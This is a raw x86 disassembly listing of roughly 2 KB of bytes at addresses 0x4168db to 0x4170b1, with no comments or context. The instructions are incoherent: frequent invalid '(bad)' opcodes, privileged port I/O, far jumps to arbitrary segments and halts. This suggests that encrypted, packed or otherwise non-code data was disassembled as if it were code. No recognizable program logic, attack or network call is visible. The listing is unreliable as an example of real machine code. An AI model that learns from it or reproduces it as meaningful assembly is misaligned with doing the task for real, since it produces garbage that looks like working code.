  4168db:	loope  0x416900
  4168dd:	cmc    
  4168de:	out    0xf,eax
  4168e0:	dec    ebp
  4168e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168e2:	mov    ah,0x9d
  4168e4:	shl    DWORD PTR [esi+ebp*8],cl
  4168e7:	aam    0x2e
  4168e9:	mov    eax,ds:0xff647708
  4168ee:	cmp    al,0xf8
  4168f0:	mov    esp,0x866205ea
  4168f5:	retf   
  4168f6:	fstp   QWORD PTR [esi+0x34]
  4168f9:	or     bp,dx
  4168fc:	hlt    
  4168fd:	rcr    DWORD PTR [edx],0xa6
  416900:	dec    ebp
  416901:	mov    WORD PTR ds:0xadbf6e58,gs
  416907:	jns    0x416894
  416909:	into   
  41690a:	inc    edi
  41690b:	inc    edi
  41690c:	sub    al,0xf3
  41690e:	push   0x35
  416910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416911:	in     al,dx
  416912:	add    DWORD PTR [edi+0x2f60ddf3],0xb9b35416
  41691c:	pushf  
  41691d:	adc    eax,0x431a3800
  416922:	imul   eax,ebx,0xffffffcd
  416925:	adc    ecx,DWORD PTR [eax+0x42279460]
  41692b:	push   ebp
  41692c:	stos   BYTE PTR es:[edi],al
  41692d:	cmp    DWORD PTR [edx-0x6746265],esi
  416933:	cwde   
  416934:	ret    
  416935:	jns    0x4168ba
  416937:	jno    0x4168e4
  416939:	add    eax,0x636686ef
  41693e:	xchg   eax,edi
  416940:	in     eax,0x24
  416942:	dec    eax
  416943:	je     0x4168c5
  416945:	and    al,0xf9
  416947:	xchg   DWORD PTR [edi+0x705426f4],eax
  41694d:	(bad)  
  41694e:	int    0x7f
  416950:	out    dx,eax
  416951:	xchg   edi,eax
  416952:	cdq    
  416953:	adc    BYTE PTR [eax-0x34c04f39],ah
  416959:	jmp    0xb4a1:0x1a3cb7ea
  416960:	out    dx,eax
  416961:	ja     0x416900
  416963:	mov    ah,0xcc
  416965:	iret   
  416966:	xchg   esp,eax
  416967:	test   BYTE PTR [eax+eax*2],ah
  41696a:	(bad)
  41696d:	or     eax,0x35df5a5c
  416972:	in     al,0xe5
  416974:	icebp  
  416975:	dec    esi
  416976:	sbb    dl,BYTE PTR [eax-0x3c]
  416979:	arpl   WORD PTR [edx+0x4d],si
  41697c:	call   DWORD PTR [eax]
  41697e:	dec    edx
  41697f:	xchg   ebp,eax
  416980:	mov    gs,edi
  416982:	adc    eax,DWORD PTR [eax+0x3a]
  416985:	sub    DWORD PTR [edi],esp
  416987:	fsub   QWORD PTR [eax-0x74]
  41698a:	push   0xffffff8f
  41698c:	pushf  
  41698d:	xor    eax,edx
  41698f:	mov    esi,0xd1b6b63f
  416994:	xchg   ebx,eax
  416995:	pop    ebp
  416996:	shl    WORD PTR [edx+ecx*8+0x7b],1
  41699b:	lods   al,BYTE PTR ds:[esi]
  41699c:	mulps  xmm0,XMMWORD PTR [edx]
  41699f:	inc    esi
  4169a0:	xor    ah,al
  4169a2:	jge    0x41695e
  4169a4:	(bad)
  4169a7:	sbb    BYTE PTR [eax+0x142e0b43],ch
  4169ad:	jmp    0x8e35:0x94c69937
  4169b4:	jmp    0xba849601
  4169b9:	jo     0x4169f0
  4169bb:	adc    edi,0xae424ede
  4169c1:	frstor [ebp-0x2]
  4169c4:	sub    al,0x9b
  4169c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169c7:	retf   0xf500
  4169ca:	data16 cld 
  4169cc:	pop    ss
  4169cd:	outs   dx,DWORD PTR ds:[esi]
  4169ce:	ds cmc 
  4169d0:	push   ss
  4169d1:	sbb    esi,DWORD PTR [ebp-0xb]
  4169d4:	sti    
  4169d5:	add    eax,0x13533f10
  4169da:	into   
  4169db:	sub    ebp,DWORD PTR [edi]
  4169dd:	mov    ds:0xf0007a92,eax
  4169e2:	lock fisubr DWORD PTR [eax+0x5]
  4169e6:	in     eax,dx
  4169e7:	sub    DWORD PTR [ebp-0x7],edi
  4169ea:	and    DWORD PTR [ebx],ebp
  4169ec:	mov    esi,0xa1dcb4a7
  4169f1:	std    
  4169f2:	and    al,0x19
  4169f4:	lahf   
  4169f5:	lds    esi,FWORD PTR [esi+ecx*4-0xd]
  4169f9:	div    DWORD PTR [eax-0x51]
  4169fc:	mov    bl,cl
  4169fe:	outs   dx,BYTE PTR ds:[esi]
  4169ff:	lods   eax,DWORD PTR ds:[esi]
  416a00:	mov    ebx,0x3cd2498a
  416a05:	pop    ebx
  416a06:	inc    ebx
  416a07:	xchg   ecx,eax
  416a08:	fidiv  DWORD PTR [ecx+ebp*8]
  416a0b:	into   
  416a0c:	cmp    BYTE PTR [edi+0x7a394e38],dl
  416a12:	mov    ebp,0x5335fa88
  416a17:	push   ds
  416a18:	xchg   esi,eax
  416a19:	pop    esp
  416a1a:	jo     0x4169fe
  416a1c:	mov    ebx,0x69710728
  416a21:	(bad)  
  416a22:	fild   DWORD PTR [ebx]
  416a24:	adc    ecx,DWORD PTR [ebx]
  416a26:	pop    ds
  416a27:	out    dx,al
  416a28:	inc    ecx
  416a29:	sti    
  416a2a:	mov    al,ds:0x5b887c6d
  416a2f:	out    0xfc,eax
  416a31:	das    
  416a32:	push   edi
  416a33:	mov    DWORD PTR [ebp-0x35d7383a],edi
  416a39:	daa    
  416a3a:	xor    BYTE PTR [ecx],al
  416a3c:	inc    edi
  416a3d:	(bad)  
  416a3f:	iret   
  416a40:	adc    eax,0xc286590a
  416a45:	cwde   
  416a46:	in     al,0x42
  416a48:	inc    ebx
  416a49:	in     eax,dx
  416a4a:	sbb    BYTE PTR [ebx-0x19],bh
  416a4d:	push   eax
  416a4e:	jg     0x416a4a
  416a50:	xor    al,0x9b
  416a52:	cmp    ah,BYTE PTR [esi]
  416a54:	loop   0x4169f8
  416a56:	and    BYTE PTR [esi-0x7],al
  416a59:	arpl   WORD PTR [ebp+0x396c8d55],ax
  416a5f:	int3   
  416a60:	jnp    0x416a38
  416a62:	add    al,0xd1
  416a64:	xor    ebp,DWORD PTR [esi-0x2faa098a]
  416a6a:	cli    
  416a6b:	daa    
  416a6c:	scas   al,BYTE PTR es:[edi]
  416a6d:	jns    0x416aec
  416a6f:	out    0x18,al
  416a71:	cmp    ah,BYTE PTR [esi+0x13]
  416a74:	pop    ds
  416a75:	mov    al,ds:0xd55cd4e7
  416a7a:	cwde   
  416a7b:	aad    0xb1
  416a7d:	pop    esi
  416a7e:	dec    ecx
  416a7f:	cli    
  416a80:	out    0xbf,al
  416a82:	add    BYTE PTR [ecx+0x62],ah
  416a85:	xchg   edx,eax
  416a86:	pop    ebx
  416a87:	iret   
  416a88:	dec    eax
  416a89:	fld    QWORD PTR ds:0x57473e31
  416a8f:	cmp    DWORD PTR ds:0xf0370757,ecx
  416a95:	mov    BYTE PTR [edx-0x45],ah
  416a98:	sbb    eax,0xeb35e78b
  416a9d:	stc    
  416a9e:	ja     0x416b11
  416aa0:	push   ecx
  416aa1:	mov    ch,0x19
  416aa3:	enter  0x2d5,0xe
  416aa7:	jnp    0x416af1
  416aa9:	mov    edx,0x80be4307
  416aae:	(bad)  
  416aaf:	jge    0x416a9d
  416ab1:	mov    esp,0x3936d767
  416ab6:	pop    eax
  416ab7:	lea    ecx,[ebx-0x34]
  416aba:	mov    dh,0xae
  416abc:	adc    BYTE PTR [ecx-0x7fc4bf8f],ah
  416ac2:	ret    
  416ac3:	pop    es
  416ac4:	pop    ebp
  416ac5:	int3   
  416ac6:	jmp    0xc6ffaceb
  416acb:	adc    ah,bl
  416acd:	xchg   esi,eax
  416ace:	xchg   ebp,eax
  416acf:	stos   DWORD PTR es:[edi],eax
  416ad0:	mov    es,WORD PTR [ecx+edx*1]
  416ad3:	dec    ecx
  416ad4:	jmp    0x87c11088
  416ad9:	mov    esp,0x1ad3be11
  416ade:	mov    edi,?
  416ae0:	into   
  416ae1:	mov    cl,0x5
  416ae3:	lds    edx,FWORD PTR [ecx-0x538a4972]
  416ae9:	pop    eax
  416aea:	sahf   
  416aeb:	or     BYTE PTR [ebp+0x59],ah
  416aee:	fwait
  416aef:	popf   
  416af0:	repnz lods eax,DWORD PTR ds:[esi]
  416af2:	xchg   ebp,eax
  416af3:	inc    edx
  416af4:	add    dh,BYTE PTR [ebp+edi*4-0x3899750a]
  416afb:	jno    0x416af9
  416afd:	xor    BYTE PTR [ebx-0x780b1e5f],cl
  416b03:	fdivr  st,st(3)
  416b05:	jmp    0x2c1c:0x7bdcb4ce
  416b0c:	pop    ecx
  416b0d:	and    DWORD PTR [eax],esi
  416b0f:	push   edx
  416b10:	jno    0x416ac6
  416b12:	push   ebp
  416b13:	outs   dx,DWORD PTR ds:[esi]
  416b14:	fwait
  416b15:	inc    edi
  416b16:	mov    ebp,0x1fc3905a
  416b1b:	jle    0x416b2d
  416b1d:	neg    ebx
  416b1f:	or     BYTE PTR ds:0xa36b2f8,ch
  416b25:	les    esi,FWORD PTR [ebp+ecx*2-0x52]
  416b29:	(bad)  
  416b2a:	dec    esi
  416b2b:	jecxz  0x416aff
  416b2d:	dec    edx
  416b2e:	sbb    al,BYTE PTR [eax+0x2c]
  416b31:	sbb    al,0xea
  416b33:	jle    0x416ad3
  416b35:	jmp    0x416aea
  416b37:	js     0x416b51
  416b39:	push   ecx
  416b3a:	cdq    
  416b3b:	(bad)  
  416b3c:	retf   
  416b3d:	call   0xac52be26
  416b42:	ret    0xc04e
  416b45:	push   cs
  416b46:	inc    ebx
  416b47:	or     BYTE PTR [eax-0x80],0xc7
  416b4b:	aaa    
  416b4c:	retf   0x548f
  416b4f:	pop    ss
  416b50:	dec    edi
  416b51:	out    dx,al
  416b52:	icebp  
  416b53:	test   DWORD PTR [eax-0x3f],0x17ff6041
  416b5a:	cmp    ebx,DWORD PTR [eax+0x79]
  416b5d:	cmp    al,bh
  416b5f:	xchg   BYTE PTR [ecx],bl
  416b61:	out    dx,eax
  416b62:	pop    edx
  416b63:	in     eax,dx
  416b64:	out    dx,al
  416b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b66:	jecxz  0x416bce
  416b68:	and    eax,0x51f9d149
  416b6d:	retf   
  416b6e:	gs int3 
  416b70:	add    DWORD PTR [edx],edi
  416b72:	and    DWORD PTR [edi],ebx
  416b74:	or     BYTE PTR [esi+eax*8-0x10],al
  416b78:	dec    edx
  416b79:	adc    al,0xde
  416b7b:	repz jb 0x416b8a
  416b7e:	outs   dx,BYTE PTR ds:[esi]
  416b7f:	adc    eax,0x1ae45246
  416b84:	inc    esi
  416b85:	(bad)  
  416b86:	ins    BYTE PTR es:[edi],dx
  416b87:	stos   BYTE PTR es:[edi],al
  416b88:	xor    ch,ah
  416b8a:	vcvtsd2ss xmm3,xmm3,QWORD PTR [ebp-0x6ef400af]
  416b92:	inc    edi
  416b93:	dec    edi
  416b94:	jmp    0x7816a9b0
  416b99:	fptan  
  416b9b:	mov    ds:0x1eb1af99,eax
  416ba0:	es mov eax,0x4fd044eb
  416ba6:	mov    dl,0xdf
  416ba8:	shl    ecx,1
  416baa:	or     BYTE PTR [eax-0x1d],bh
  416bad:	or     al,ch
  416baf:	int    0x3f
  416bb1:	retf   
  416bb2:	data16 xlat BYTE PTR ds:[ebx]
  416bb4:	lea    esp,[ebp+0x6ec0fbfe]
  416bba:	lock outs dx,DWORD PTR ds:[esi]
  416bbc:	aam    0x92
  416bbe:	sub    edi,eax
  416bc0:	xchg   BYTE PTR [ecx],ah
  416bc2:	mov    edi,0xc66b1865
  416bc7:	bound  ecx,QWORD PTR [edx]
  416bc9:	mov    edx,0xbc7ce22f
  416bce:	push   ss
  416bcf:	int    0x2a
  416bd1:	add    al,0xc7
  416bd3:	in     eax,0xf6
  416bd5:	cld    
  416bd6:	and    BYTE PTR [edx],bh
  416bd8:	xchg   esp,eax
  416bd9:	adc    al,0x5b
  416bdb:	and    al,BYTE PTR [esi-0x6a9c376a]
  416be1:	xor    edi,ebp
  416be3:	call   0x2410:0x51ea2046
  416bea:	pop    ss
  416beb:	ins    BYTE PTR es:[edi],dx
  416bec:	xor    BYTE PTR [edx-0x6c],bh
  416bef:	push   eax
  416bf0:	test   eax,0x2a34f2e8
  416bf5:	repnz pop ss
  416bf7:	push   esi
  416bf8:	or     eax,0x8fee45c0
  416bfd:	scas   al,BYTE PTR es:[edi]
  416bfe:	xor    eax,0x28a2fdac
  416c03:	outs   dx,BYTE PTR ds:[esi]
  416c04:	fwait
  416c05:	push   0xffffffca
  416c07:	fs clc 
  416c09:	aas    
  416c0a:	sub    al,BYTE PTR [ecx]
  416c0c:	adc    al,BYTE PTR [edi-0x3f70ccc4]
  416c12:	mov    ah,0x2c
  416c14:	push   edx
  416c15:	xchg   edx,eax
  416c16:	fcmovu st,st(6)
  416c18:	std    
  416c19:	xchg   esp,eax
  416c1a:	imul   eax,DWORD PTR [esi+ecx*8+0x57efe71b],0x6f1b7259
  416c25:	sub    eax,0x53ebc707
  416c2a:	idiv   bh
  416c2c:	(bad)  
  416c2d:	xchg   esp,eax
  416c2e:	mov    ch,0xd5
  416c30:	sub    eax,0xf4497776
  416c35:	pop    ds
  416c36:	inc    esp
  416c37:	(bad)  
  416c38:	jb     0x416c95
  416c3a:	std    
  416c3b:	cmp    DWORD PTR fs:[eax-0x4e],edi
  416c3f:	cmp    DWORD PTR [edx-0x4a],ecx
  416c42:	push   ebx
  416c43:	pop    ebp
  416c44:	cmp    edx,DWORD PTR [edi-0x2c]
  416c47:	push   0xa5cf4383
  416c4c:	nop
  416c4d:	loop   0x416c8a
  416c4f:	xor    al,0xc6
  416c51:	push   edi
  416c52:	inc    ebx
  416c53:	jno    0x416c6b
  416c55:	int    0xfd
  416c57:	lock mov ebx,ebx
  416c5a:	arpl   WORD PTR [ecx],bx
  416c5c:	xor    esp,edi
  416c5e:	je     0x416cde
  416c60:	jmp    0xcc47:0x263c4ec
  416c67:	sub    BYTE PTR [ebp-0x3981a61],dl
  416c6d:	adc    eax,0xe0475ece
  416c72:	mov    edx,0x72be7bf3
  416c77:	rcl    DWORD PTR [edi+0x7fe0efb9],1
  416c7d:	mov    ebx,0xb0d66987
  416c82:	pop    es
  416c83:	loop   0x416c97
  416c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c86:	cmp    eax,ecx
  416c88:	sub    al,ah
  416c8a:	push   ebp
  416c8b:	adc    ecx,esi
  416c8d:	fmul   DWORD PTR [eax-0x253947f0]
  416c93:	imul   edx,DWORD PTR [edx-0x421a1cbf],0x49ec8f9b
  416c9d:	and    DWORD PTR [edi+0x46aadb8f],eax
  416ca3:	pop    esp
  416ca4:	in     eax,0xc4
  416ca6:	outs   dx,DWORD PTR es:[esi]
  416ca8:	xchg   edi,eax
  416ca9:	inc    ebp
  416caa:	pushf  
  416cab:	dec    ebp
  416cac:	daa    
  416cad:	push   0xdce7f1ef
  416cb2:	inc    esp
  416cb3:	mov    eax,DWORD PTR [ebp+ebp*4-0x37bbb85a]
  416cba:	inc    eax
  416cbb:	push   esi
  416cbc:	pop    es
  416cbd:	dec    ecx
  416cbe:	jno    0x416cb9
  416cc0:	aas    
  416cc1:	mov    esp,0x38e2ffc4
  416cc6:	mov    DWORD PTR [eax-0x56],ebp
  416cc9:	jb     0x416c6d
  416ccb:	or     edx,DWORD PTR [eax-0x31bc554f]
  416cd1:	add    DWORD PTR [ecx+0x5b],eax
  416cd4:	adc    BYTE PTR [edx-0x2],cl
  416cd7:	enter  0xfd6a,0x9e
  416cdb:	cs xchg esi,eax
  416cdd:	and    BYTE PTR [esi+eax*8-0x20],0xd5
  416ce2:	jnp    0x416cf4
  416ce4:	jno    0x416d27
  416ce6:	xlat   BYTE PTR ds:[ebx]
  416ce7:	sti    
  416ce8:	in     al,dx
  416ce9:	fprem1 
  416ceb:	push   ss
  416cec:	repnz mov esi,0xc02f500b
  416cf2:	das    
  416cf3:	push   es
  416cf4:	push   edx
  416cf5:	mov    ebx,0x77675e35
  416cfa:	(bad)  
  416cfb:	out    dx,al
  416cfc:	js     0x416d29
  416cfe:	cmc    
  416cff:	inc    edx
  416d00:	(bad)  
  416d01:	and    al,0xd9
  416d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d04:	repnz push esp
  416d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d07:	mov    edi,0x11d60e3a
  416d0c:	js     0x416c8f
  416d0e:	int3   
  416d0f:	or     eax,ebx
  416d11:	aam    0xba
  416d13:	mov    esi,0x793fedfa
  416d18:	mov    eax,0x28e5de4b
  416d1d:	repnz stc 
  416d1f:	push   ecx
  416d20:	lahf   
  416d21:	pop    edi
  416d22:	mov    ah,0x13
  416d24:	(bad)  
  416d25:	rcr    DWORD PTR [eax-0x50],1
  416d28:	loopne 0x416d9f
  416d2a:	test   ecx,ebp
  416d2c:	mov    esi,0x651eef41
  416d31:	pop    edx
  416d32:	hlt    
  416d33:	add    eax,0x95fb3f1b
  416d38:	iret   
  416d39:	cwde   
  416d3a:	repnz repnz pusha 
  416d3d:	pop    edi
  416d3e:	adc    esp,esi
  416d40:	dec    ecx
  416d41:	aam    0x4a
  416d43:	stos   BYTE PTR es:[edi],al
  416d44:	inc    eax
  416d45:	stos   BYTE PTR es:[edi],al
  416d46:	add    bl,dh
  416d48:	push   cs
  416d49:	in     eax,dx
  416d4a:	cmp    al,0x59
  416d4c:	loop   0x416d54
  416d4e:	ins    DWORD PTR es:[edi],dx
  416d4f:	mov    ebx,0x5a577289
  416d54:	int3   
  416d55:	cmp    eax,0x59fc9479
  416d5a:	push   ds
  416d5b:	int    0x41
  416d5d:	mov    ebx,0x7989bbac
  416d62:	call   0xfd6d:0x741babe6
  416d69:	push   0xd5c4da3c
  416d6e:	xlat   BYTE PTR ds:[ebx]
  416d6f:	scas   al,BYTE PTR es:[edi]
  416d70:	or     BYTE PTR [ebx],cl
  416d72:	xchg   esp,eax
  416d73:	xchg   edi,eax
  416d74:	push   0x22
  416d76:	and    ebp,esp
  416d78:	shl    DWORD PTR [eax+0xcf8194],1
  416d7e:	imul   esp,DWORD PTR [ebp+0x3f71c55e],0x42896626
  416d88:	mov    BYTE PTR [ebx],al
  416d8a:	addr16 mov ebx,ebx
  416d8d:	lahf   
  416d8e:	ja     0x416daf
  416d90:	mov    ds:0x15a72ba5,al
  416d95:	fwait
  416d96:	nop
  416d97:	or     bl,BYTE PTR [esi+0x6c]
  416d9a:	into   
  416d9b:	lahf   
  416d9c:	mov    dh,0xfa
  416d9e:	mov    esi,0x6bb7f4a
  416da3:	outs   dx,BYTE PTR ds:[esi]
  416da4:	js     0x416d6d
  416da6:	repnz mov al,ds:0x4be0f408
  416dac:	add    DWORD PTR [ebx-0x25b8a128],0x9436302e
  416db6:	push   0xffffffe6
  416db8:	aas    
  416db9:	sub    eax,DWORD PTR [ebx]
  416dbb:	xor    eax,0x561c5f4c
  416dc0:	cmp    al,0xe3
  416dc2:	push   esi
  416dc3:	leave  
  416dc4:	in     eax,dx
  416dc5:	scas   al,BYTE PTR es:[edi]
  416dc6:	(bad)  
  416dc7:	mov    ebx,0xed29b7c
  416dcc:	xchg   edi,eax
  416dcd:	loop   0x416e19
  416dcf:	pop    ebx
  416dd0:	and    eax,0xd3c8e6f6
  416dd5:	push   ebp
  416dd6:	fwait
  416dd7:	jne    0x416df6
  416dd9:	fmul   DWORD PTR [ebx+0x76]
  416ddc:	popf   
  416ddd:	jmp    0x87f5:0xd13b2ff3
  416de4:	cmc    
  416de5:	add    DWORD PTR [edi+0x17],ebx
  416de8:	(bad)  
  416de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dea:	inc    esi
  416deb:	data16 (bad) 
  416dee:	pop    ss
  416def:	pop    ebx
  416df0:	js     0x416e6f
  416df2:	xor    BYTE PTR [ecx],bl
  416df4:	inc    edi
  416df5:	inc    ebp
  416df6:	pop    esp
  416df7:	inc    ecx
  416df8:	xchg   ecx,eax
  416df9:	imul   esp,ebx,0x6e
  416dfc:	xchg   edi,eax
  416dfd:	(bad)  
  416dfe:	enter  0x6d0d,0x84
  416e02:	inc    ebp
  416e03:	dec    ecx
  416e04:	and    bh,ch
  416e06:	jo     0x416e43
  416e08:	adc    eax,0x75bcf2df
  416e0d:	xchg   ecx,eax
  416e0e:	clc    
  416e0f:	dec    ebp
  416e10:	fbstp  TBYTE PTR [edi]
  416e12:	ja     0x416dff
  416e14:	mov    al,bh
  416e16:	scas   eax,DWORD PTR es:[edi]
  416e17:	pop    ecx
  416e18:	imul   edx,DWORD PTR [eax+0x68],0xffffffbe
  416e1c:	(bad)  
  416e1d:	test   eax,0x5171184
  416e22:	mov    ecx,0x96852997
  416e27:	add    dh,BYTE PTR [ecx]
  416e29:	mov    eax,ds:0xc5bbd78c
  416e2e:	inc    ecx
  416e2f:	add    eax,0x8c54a8e
  416e34:	sbb    dl,BYTE PTR [edi+0x314413f6]
  416e3a:	shr    edi,cl
  416e3c:	(bad)  
  416e3d:	daa    
  416e3e:	and    DWORD PTR [edx],ebp
  416e40:	adc    eax,0x9349fcbc
  416e45:	xchg   BYTE PTR [esi+0x60e1d03f],ah
  416e4b:	ja     0x416e70
  416e4d:	sub    BYTE PTR [ebp-0x65eaf7e4],dh
  416e53:	test   al,0xce
  416e55:	jg     0x416df2
  416e57:	fisttp WORD PTR [eax-0x42]
  416e5a:	(bad)  
  416e5b:	jns    0x416df5
  416e5d:	mov    al,0xc1
  416e5f:	inc    edx
  416e60:	jbe    0x416ec4
  416e62:	lea    ecx,[ecx]
  416e64:	cmp    BYTE PTR [eax+0x4504b608],bl
  416e6a:	(bad)  
  416e6b:	push   edi
  416e6c:	mov    ebx,0x50201f8d
  416e71:	add    ebp,0xd800af30
  416e77:	not    DWORD PTR [eax-0x35dbfe35]
  416e7d:	arpl   WORD PTR [edx+0x11a40913],bp
  416e83:	in     eax,dx
  416e84:	icebp  
  416e85:	push   ecx
  416e86:	push   esp
  416e87:	fs jp  0x416e28
  416e8a:	jl     0x416eb4
  416e8c:	lods   eax,DWORD PTR ds:[esi]
  416e8d:	xor    BYTE PTR [edx+edx*8+0x2da1f49],cl
  416e94:	jne    0x416e8d
  416e96:	pop    ecx
  416e97:	push   es
  416e98:	xchg   esp,eax
  416e99:	jg     0x416ef6
  416e9b:	pop    ebp
  416e9c:	and    cl,dl
  416e9e:	arpl   WORD PTR [eax-0x785993a],ax
  416ea4:	mov    DWORD PTR [ebp-0x4],ebx
  416ea7:	mov    al,ds:0x5036fb06
  416eac:	lods   eax,DWORD PTR ds:[esi]
  416ead:	lock enter 0xbb2a,0x7b
  416eb2:	(bad)
  416eb5:	adc    al,0xad
  416eb7:	jp     0x416f0c
  416eb9:	and    eax,0xa988e42e
  416ebe:	lods   al,BYTE PTR ds:[esi]
  416ebf:	les    edx,FWORD PTR [ebx]
  416ec1:	iret   
  416ec2:	cmp    cl,bh
  416ec4:	dec    ebp
  416ec5:	cld    
  416ec6:	xor    al,0x7e
  416ec8:	push   0x14
  416eca:	in     al,dx
  416ecb:	jo     0x416eec
  416ecd:	fild   QWORD PTR [esi+eax*1]
  416ed0:	dec    eax
  416ed1:	fcmovb st,st(0)
  416ed3:	out    0x5a,eax
  416ed5:	test   eax,0x2f1f0d4b
  416eda:	ret    0x1842
  416edd:	mov    cl,0x2a
  416edf:	(bad)  
  416ee0:	mov    dl,0x73
  416ee2:	jae    0x416e8d
  416ee4:	icebp  
  416ee5:	aaa    
  416ee6:	fisttp DWORD PTR [ecx]
  416ee8:	ret    
  416ee9:	adc    al,0xf7
  416eeb:	mov    eax,0x1f328d21
  416ef0:	jne    0x416eb6
  416ef2:	xor    BYTE PTR [edi+0x5ab71b9d],ah
  416ef8:	push   ebx
  416ef9:	pop    esi
  416efa:	leave  
  416efb:	xor    al,0x20
  416efd:	cdq    
  416efe:	and    ebp,DWORD PTR [esi+0x328be177]
  416f04:	push   ecx
  416f05:	sub    BYTE PTR [esp+edx*4],dl
  416f08:	mov    dh,0xfb
  416f0a:	test   eax,0xa851831d
  416f0f:	repz lahf 
  416f11:	fs mov ebx,0xa519ba41
  416f17:	loope  0x416eb1
  416f19:	inc    ebx
  416f1a:	xchg   ebp,eax
  416f1b:	es push 0x88510b0b
  416f21:	gs jae 0x416f40
  416f24:	dec    esi
  416f25:	leave  
  416f26:	or     dl,BYTE PTR [eax-0x36ac48c3]
  416f2c:	mov    ch,0xe0
  416f2e:	pusha  
  416f2f:	push   ds
  416f30:	xchg   DWORD PTR [edx+ebp*4],edx
  416f33:	cs sbb al,0xce
  416f36:	popf   
  416f37:	inc    ecx
  416f38:	rcr    BYTE PTR ds:0xd993c5ba,0xb1
  416f3f:	retf   0xee67
  416f42:	and    eax,0x8e807b33
  416f47:	fmul   DWORD PTR [edx]
  416f49:	mov    ds:0xf0f7531d,al
  416f4e:	jl     0x416fc0
  416f50:	dec    ebx
  416f51:	fsubr  DWORD PTR [edi]
  416f53:	sub    eax,0x3ef8835b
  416f58:	loope  0x416f23
  416f5a:	sbb    eax,0x225d4548
  416f5f:	and    al,0x70
  416f61:	pop    esp
  416f62:	aad    0x9c
  416f64:	sub    al,0xc
  416f66:	dec    eax
  416f67:	mov    ds:0x92efb7c8,eax
  416f6c:	and    esp,DWORD PTR [edx*8+0x5abc6ada]
  416f73:	add    dl,BYTE PTR [eax+0x45]
  416f76:	popf   
  416f77:	push   ds
  416f78:	push   ecx
  416f79:	daa    
  416f7a:	mov    dl,0xa5
  416f7c:	jmp    edx
  416f7e:	jl     0x416f96
  416f80:	push   ss
  416f81:	out    dx,al
  416f82:	push   ebp
  416f83:	inc    edx
  416f84:	in     eax,0xfd
  416f86:	fisttp WORD PTR [eax-0x61fb3b6]
  416f8c:	and    BYTE PTR [edi-0x3766eccb],dh
  416f92:	push   esi
  416f93:	pop    es
  416f94:	mov    dl,0xf9
  416f96:	test   eax,0x6a0b4227
  416f9b:	setl   al
  416f9e:	jae    0x416f33
  416fa0:	aas    
  416fa1:	cmp    bh,BYTE PTR [eax]
  416fa3:	add    al,0xd
  416fa5:	lahf   
  416fa6:	mov    bl,0xe3
  416fa9:	ins    BYTE PTR es:[edi],dx
  416faa:	inc    esp
  416fab:	sub    DWORD PTR [ebx+0x68042003],0x256370a5
  416fb5:	cli    
  416fb6:	xchg   esp,eax
  416fb7:	mov    esp,0x8467e8a7
  416fbc:	jb     0x416f69
  416fbe:	ret    
  416fbf:	leave  
  416fc0:	cld    
  416fc1:	jne    0x416f6f
  416fc3:	mov    DWORD PTR [eax+0x31f6468a],ebx
  416fc9:	aad    0x88
  416fcb:	cmp    bl,BYTE PTR [ebp-0x6c865fe2]
  416fd1:	jb     0x417033
  416fd3:	adc    al,0xff
  416fd5:	sub    bh,0xc0
  416fd8:	retf   0xe4
  416fdb:	jns    0x416f98
  416fdd:	or     dh,ah
  416fdf:	in     al,dx
  416fe0:	cs lahf 
  416fe2:	out    dx,al
  416fe3:	xor    dl,BYTE PTR [ebx-0x1ad5d1cb]
  416fe9:	ret    0xaaa9
  416fec:	inc    ecx
  416fed:	add    edi,DWORD PTR [esi]
  416fef:	and    bl,bl
  416ff1:	ror    DWORD PTR [esi+0x3d9f708a],1
  416ff7:	xchg   edx,eax
  416ff8:	repz dec ebp
  416ffa:	push   0x12
  416ffc:	in     eax,dx
  416ffd:	aam    0x4f
  416fff:	(bad)  
  417001:	and    esi,DWORD PTR [esi]
  417003:	push   ecx
  417004:	push   ebx
  417005:	mov    ds:0x44f00e61,eax
  41700a:	mov    edi,0xc1d6faa2
  41700f:	out    0x4a,eax
  417011:	retf   0x7fea
  417014:	and    DWORD PTR [edi-0x4e],ebp
  417017:	or     cl,0x71
  41701a:	dec    ecx
  41701b:	jno    0x417020
  41701d:	enter  0x841a,0x7e
  417021:	call   0x1c1b:0x58b72cee
  417028:	jno    0x41703e
  41702a:	dec    ecx
  41702b:	loop   0x417038
  41702d:	or     DWORD PTR [edx+0x7f],edx
  417030:	and    ebx,eax
  417032:	jl     0x416fde
  417034:	mov    DWORD PTR [ecx+0x12],0xf1f28e0e
  41703b:	cmp    ecx,edi
  41703d:	or     bl,dl
  41703f:	add    ecx,DWORD PTR [esi+edi*4-0x71820682]
  417046:	push   cs
  417047:	push   edi
  417048:	dec    edi
  417049:	icebp  
  41704a:	pop    ecx
  41704b:	ins    DWORD PTR es:[edi],dx
  41704c:	pop    ecx
  41704e:	jle    0x4170b8
  417050:	sbb    bh,BYTE PTR [ebx+0x5d2d2d04]
  417056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417057:	scas   al,BYTE PTR es:[edi]
  417058:	hlt    
  417059:	hlt    
  41705a:	sub    eax,0xd9f0ca34
  41705f:	sbb    eax,0xe3f4d8e0
  417064:	std    
  417065:	mov    edx,0xa1dc6630
  41706a:	cmp    al,0xe8
  41706c:	mov    edx,0xc3c49e76
  417071:	div    ebx
  417073:	dec    esi
  417074:	fidiv  DWORD PTR [eax]
  417076:	lods   al,BYTE PTR ds:[esi]
  417077:	dec    ebx
  417078:	gs push esp
  41707a:	cmp    ecx,esi
  41707c:	in     al,0x9
  41707e:	pop    ecx
  41707f:	xchg   edx,eax
  417080:	cmp    dh,BYTE PTR gs:0x1f458a13
  417087:	fst    QWORD PTR [edx+0xd77879a]
  41708d:	ret    0x5eb4
  417090:	fwait
  417091:	out    dx,al
  417092:	add    al,0xf3
  417094:	and    eax,0xad4c3790
  417099:	in     eax,dx
  41709a:	fist   WORD PTR [edx-0xc6de7d0]
  4170a0:	adc    ebp,0x14
  4170a3:	inc    esi
  4170a4:	or     DWORD PTR ds:0xba408df1,ecx
  4170ab:	pop    esi
  4170ac:	sbb    ecx,ebx
  4170ae:	sti    
  4170af:	iret   
  4170b0:	push   ss
  4170b1:	dec    edi
